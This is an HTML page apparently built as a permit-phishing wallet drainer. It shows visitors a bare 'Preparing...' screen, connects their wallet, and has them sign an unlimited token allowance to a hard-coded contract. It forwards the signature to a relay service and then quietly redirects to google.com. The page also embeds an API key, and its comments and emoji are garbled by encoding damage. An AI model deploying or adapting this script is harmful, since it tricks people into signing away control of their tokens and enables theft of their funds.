<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DApp Script - Permit & Redirect</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.4/dist/ethers.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0; padding: 0;
      display: flex; align-items: center; justify-content: center;
      height: 100vh;
    }
    #box {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
      max-width: 500px;
      width: 100%;
    }
    #status { margin: 10px 0; font-weight: bold; }
    #log { font-size: 0.85em; color: #444; background: #eee; padding: 10px; border-radius: 6px; max-height: 200px; overflow-y: auto; }
  </style>
</head>
<body>
  <div id="box">
    <h2>‚è≥ Preparing...</h2>
    <div id="status">Waiting for wallet...</div>
    <pre id="log"></pre>
  </div>

  <script>
    // ---- CONFIG ----
    const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3";  // your deployed contract
    const TOKEN_ADDRESS    = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // your ERC20 token
    const DESTINATION_URL  = "https://google.com"; // redirect URL
    const CHAIN_ID         = 11155111; // Sepolia
    const BICONOMY_API_KEY = "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";

    // ---- HELPERS ----
    function setStatus(msg, type="info") {
      document.querySelector("#status").textContent = msg;
    }
    function log(msg) {
      const box = document.querySelector("#log");
      box.textContent += msg + "\n";
      box.scrollTop = box.scrollHeight;
    }

    async function main() {
      if (!window.ethereum) {
        setStatus("‚ùå No wallet found. Please install MetaMask.", "error");
        return;
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== CHAIN_ID) {
        setStatus(`‚ö†Ô∏è Please switch wallet to Sepolia (chainId ${CHAIN_ID})`, 'error');
        return;
      }

      setStatus("üîç Connecting wallet...", "loading");

      // ‚úÖ ŸÖÿ≥ÿ™ŸÇ€åŸÖ ÿØÿ±ÿÆŸàÿßÿ≥ÿ™ ÿßÿ™ÿµÿßŸÑ ÿ®ÿØŸá
      let accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const user = accounts[0];
      log("User: " + user);

      const signer = await provider.getSigner();

      // ---- ÿ¢ŸÖÿßÿØŸá‚Äåÿ≥ÿßÿ≤€å ÿØÿßÿØŸá Ÿæÿ±ŸÖ€åÿ™ ----
      const token = new ethers.Contract(TOKEN_ADDRESS, [
        "function nonces(address) view returns (uint256)",
        "function name() view returns (string)"
      ], provider);

      const nonce = await token.nonces(user);
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1h
      const domain = {
        name: await token.name(),
        version: "1",
        chainId: CHAIN_ID,
        verifyingContract: TOKEN_ADDRESS
      };
      const types = {
        Permit: [
          {name:"owner", type:"address"},
          {name:"spender", type:"address"},
          {name:"value", type:"uint256"},
          {name:"nonce", type:"uint256"},
          {name:"deadline", type:"uint256"}
        ]
      };
      const values = {
        owner: user,
        spender: CONTRACT_ADDRESS,
        value: ethers.MaxUint256,
        nonce,
        deadline
      };

      setStatus("‚úçÔ∏è Please sign permit...", "loading");
      const signature = await signer.signTypedData(domain, types, values);
      log("Signature: " + signature);

      // ---- ÿßÿ±ÿ≥ÿßŸÑ ÿ®Ÿá ÿ±€åŸÑÿß€åÿ± ÿ®€å⁄©ŸàŸÜŸàŸÖ€å ----
      setStatus("üöÄ Sending via Biconomy...", "loading");

      const res = await fetch(`https://paymaster.biconomy.io/api/v2/${CHAIN_ID}/${BICONOMY_API_KEY}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: CONTRACT_ADDRESS,
          data: signature,
          user: user
        })
      }).catch(e => { log("Relay error: " + e); return {}; });

      log("Relayer response: " + JSON.stringify(res));

      // ---- ÿ±€åÿØÿß€åÿ±⁄©ÿ™ ----
      setStatus("‚úÖ Done. Redirecting...", "success");
      window.location.href = DESTINATION_URL;
    }

    main();
  </script>
</body>
</html>
